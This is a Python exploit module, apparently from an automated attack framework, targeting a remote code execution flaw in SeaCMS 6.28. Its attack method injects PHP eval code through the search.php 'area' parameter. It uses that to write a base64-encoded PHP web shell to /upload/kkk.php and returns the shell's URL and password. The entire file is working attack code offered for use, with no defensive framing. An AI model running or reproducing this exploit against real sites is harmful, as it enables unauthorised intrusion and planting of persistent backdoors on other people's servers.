#!/usr/bin/env python
# -*- coding: utf-8 -*-

# author: zhangxf55

# SeaCMS 6.28 Remote Code Execution
# See: https://blog.csdn.net/fsdzsec/article/details/53132362

import sys
sys.path.append('..')
import requests
from utils import Utils
from models.engine import Engine
from configuration import configuration
from models.payload import Payload, PayloadFailException

class P(Payload):
    def attack(self):
        url = "http://{}/search.php?searchtype=5&tid=&area=eval($_POST[cmd])".format(self.host)
        shellContent = Utils.base64('<?php  @eval($_POST[\'am\']);?>1')
        shellPath = "/upload/kkk.php"
        shellLocation = configuration.webRoot + shellPath
        # ' " = + must not exist in payload
        data = {
            "cmd": "file_put_contents(base64_decode({}),base64_decode({}));".format(Utils.base64(shellLocation).strip('='), shellContent)
        }
        
        try:
            resp = requests.post(url=url, data=data, headers=configuration.headers, timeout=2)
            if resp.status_code == 200:
                shellUrl = "http://{}{}".format(self.host, shellPath)
                return shellUrl, "am"
            else:
                raise PayloadFailException
        except:
            raise PayloadFailException
